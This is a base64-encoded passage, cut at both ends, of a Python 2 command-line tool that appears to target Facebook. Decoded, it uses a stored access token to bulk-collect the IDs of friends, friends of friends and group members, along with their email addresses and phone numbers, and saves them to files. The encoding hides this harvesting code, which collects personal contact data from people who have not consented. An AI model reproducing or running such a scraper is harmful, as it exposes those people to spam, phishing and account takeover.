Y2F0aW9uJ11bJ25hbWUnXQoJCQlleGNlcHQgS2V5RXJyb3I6IHByaW50ICdcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1Mb2NhdGlvblwwMzNbMTs5N20gICAgICA6IFwwMzNbMTs5MW1Ob3QgZm91bmQnCgkJCXRyeToKCQkJCXByaW50ICdcMDMzWzE7OTFtW+KeuV0gXDAzM1sxOzkybURhdGUgb2YgYmlydGhcMDMzWzE7OTdtIDogJyt6WydiaXJ0aGRheSddCgkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW1bP10gXDAzM1sxOzkybURhdGUgb2YgYmlydGhcMDMzWzE7OTdtIDogXDAzM1sxOzkxbU5vdCBmb3VuZCcKCQkJdHJ5OgoJCQkJcHJpbnQgJ1wwMzNbMTs5MW1b4p65XSBcMDMzWzE7OTJtU2Nob29sXDAzM1sxOzk3bSAgICAgICAgOiAnCgkJCQlmb3IgcSBpbiB6WydlZHVjYXRpb24nXToKCQkJCQl0cnk6CgkJCQkJCXByaW50ICdcMDMzWzE7OTFtICAgICAgICAgICAgICAgICAgIH4gXDAzM1sxOzk3bScrcVsnc2Nob29sJ11bJ25hbWUnXQoJCQkJCWV4Y2VwdCBLZXlFcnJvcjogcHJpbnQgJ1wwMzNbMTs5MW0gICAgICAgICAgICAgICAgICAgfiBcMDMzWzE7OTFtTm90IGZvdW5kJwoJCQlleGNlcHQgS2V5RXJyb3I6IHBhc3MKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJbWVudSgpCgkJZWxzZToKCQkJcGFzcwoJZWxzZToKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gVXNlciBub3QgZm91bmQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51KCkKCQkKIyMjIyMgRFVNUCAjIyMjIwpkZWYgZHVtcCgpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEuXDAzM1sxOzk3bSBHZXQgSUQgZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gR2V0IElEIGZyaWVuZCBmcm9tIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMy5cMDMzWzE7OTdtIEdldCBJRCBTZWFyY2giCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1sxOzk3bSBHZXQgZ3JvdXAgbWVtYmVyIElEIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm01LlwwMzNbMTs5N20gR2V0IGdyb3VwIG1lbWJlciBlbWFpbCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNi5cMDMzWzE7OTdtIEdldCBncm91cCBtZW1iZXIgcGhvbmUgbnVtYmVyIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm03LlwwMzNbMTs5N20gR2V0IGVtYWlsIGZyaWVuZCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtOC5cMDMzWzE7OTdtIEdldCBlbWFpbCBmcmllbmQgZnJvbSBmcmllbmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTkuXDAzM1sxOzk3bSBHZXQgYSBmcmllbmQncyBwaG9uZSBudW1iZXIiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTEwLlwwMzNbMTs5N20gR2V0IGEgZnJpZW5kJ3MgcGhvbmUgbnVtYmVyIGZyb20gZnJpZW5kIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglkdW1wX3BpbGloKCkKIy0tLS0tcGlsaWgKZGVmIGR1bXBfcGlsaWgoKToKCWN1aWggPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtRCBcMDMzWzE7OTdtIikKCWlmIGN1aWggPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQlkdW1wX3BpbGloKCkKCWVsaWYgY3VpaCA9PSIxIjoKCQlpZF90ZW1hbigpCgllbGlmIGN1aWggPT0iMiI6CgkJaWRmcm9tX3RlbWFuKCkKCWVsaWYgY3VpaCA9PSIzIjoKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCAiXDAzM1sxOzkxbVNlZ2VyYSIKCQlrZWx1YXIoKQoJZWxpZiBjdWloID09IjQiOgoJCWlkX21lbWJlcl9ncnVwKCkKCWVsaWYgY3VpaCA9PSI1IjoKCQllbV9tZW1iZXJfZ3J1cCgpCgllbGlmIGN1aWggPT0iNiI6CgkJbm9fbWVtYmVyX2dydXAoKQoJZWxpZiBjdWloID09IjciOgoJCWVtYWlsKCkKCWVsaWYgY3VpaCA9PSI4IjoKCQllbWFpbGZyb21fdGVtYW4oKQoJZWxpZiBjdWloID09IjkiOgoJCW5vbW9yX2hwKCkKCWVsaWYgY3VpaCA9PSIxMCI6CgkJaHBmcm9tX3RlbWFuKCkKCWVsaWYgY3VpaCA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJZHVtcF9waWxpaCgpCgkJCiMjIyMjIElEIFRFTUFOICMjIyMjCmRlZiBpZF90ZW1hbigpOgoJb3Muc3lzdGVtKCdyZXNldCcpCgl0cnk6CgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlyPXJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldCkKCQl6PWpzb24ubG9hZHMoci50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGlkIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWJ6ID0gb3Blbignb3V0L2lkX3RlbWFuLnR4dCcsJ3cnKQoJCWZvciBhIGluIHpbJ2RhdGEnXToKCQkJaWR0ZW1hbi5hcHBlbmQoYVsnaWQnXSkKCQkJYnoud3JpdGUoYVsnaWQnXSArICdcbicpCgkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGlkdGVtYW4pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK2FbJ2lkJ10pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCgkJYnouY2xvc2UoKQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGlkdGVtYW4pKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9pZF90ZW1hbi50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlrZWx1YXIoKQoKIyMjIyMgSUQgRlJPTSBURU1BTiAjIyMjIwpkZWYgaWRmcm9tX3RlbWFuKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQlvcCA9IGpzb24ubG9hZHMoam9rLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJcj1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/ZmllbGRzPWZyaWVuZHMubGltaXQoOTAwMDApJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCXo9anNvbi5sb2FkcyhyLnRleHQpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGFsbCBmcmllbmQgaWQgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYnogPSBvcGVuKCdvdXQvaWRfdGVtYW5fZnJvbV90ZW1hbi50eHQnLCd3JykKCQlmb3IgYSBpbiB6WydmcmllbmRzJ11bJ2RhdGEnXToKCQkJaWRmcm9tdGVtYW4uYXBwZW5kKGFbJ2lkJ10pCgkJCWJ6LndyaXRlKGFbJ2lkJ10gKyAnXG4nKQoJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihpZGZyb210ZW1hbikpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrYVsnaWQnXSksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQliei5jbG9zZSgpCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgaWQgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaWRmcm9tdGVtYW4pKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9pZF90ZW1hbl9mcm9tX3RlbWFuLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCgojIyMjIyBJRCBGUk9NIE1FTUJFUiBHUlVQICMjIyMjCmRlZiBpZF9tZW1iZXJfZ3J1cCgpOgoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJaWQ9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQlhc3c9anNvbi5sb2FkcyhyLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBpZCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlieiA9IG9wZW4oJ291dC9tZW1iZXJfZ3J1cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCWlkbWVtLmFwcGVuZChhWydpZCddKQoJCQliei53cml0ZShhWydpZCddICsgJ1xuJykKCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaWRtZW0pKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK2FbJ2lkJ10pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCgkJYnouY2xvc2UoKQoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGlkIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgSUQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGlkbWVtKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbWVtYmVyX2dydXAudHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJa2VsdWFyKCkKCQkKIyMjIyMgRU1BSUwgRlJPTSBHUlVQICMjIyMjCmRlZiBlbV9tZW1iZXJfZ3J1cCgpOgoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5ta2Rpcignb3V0JykKCWV4Y2VwdCBPU0Vycm9yOgoJCXBhc3MKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJaWQ9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCQl0cnk6CgkJCXI9cmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9ncm91cC8/aWQ9JytpZCsnJmFjY2Vzc190b2tlbj0nK3Rva2V0KQoJCQlhc3c9anNvbi5sb2FkcyhyLnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tIGdyb3VwIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiK2Fzd1snbmFtZSddCgkJZXhjZXB0IEtleUVycm9yOgoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtR2V0IGdyb3VwIG1lbWJlciBlbWFpbCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlieiA9IG9wZW4oJ291dC9lbV9tZW1iZXJfZ3J1cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCWVtbWVtLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJYnoud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbW1lbSkpKyJcMDMzWzE7OTdtIF1cMDMzWzE7OTdtPT4gXDAzM1sxOzk3bSIrelsnZW1haWwnXSsiIHwgIit6WyduYW1lJ10rIlxuIiksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDAwMSkKCQkJZXhjZXB0IEtleUVycm9yOgoJCQkJcGFzcwoJCWJ6LmNsb3NlKCkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAnXHJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtU3VjY2Vzc2Z1bGx5IGdldCBlbWFpbCBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIEVtYWlsIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlKGxlbihlbW1lbSkpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L2VtX21lbWJlcl9ncnVwLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWtlbHVhcigpCgkJCiMjIyMjIE5PTUVSIEZST00gR1JVUCAjIyMjIwpkZWYgbm9fbWVtYmVyX2dydXAoKToKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCWlkPXJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICcpCgkJdHJ5OgoJCQlyPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScraWQrJyZhY2Nlc3NfdG9rZW49Jyt0b2tldCkKCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQoJCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiCgkJCXJhd19pbnB1dCg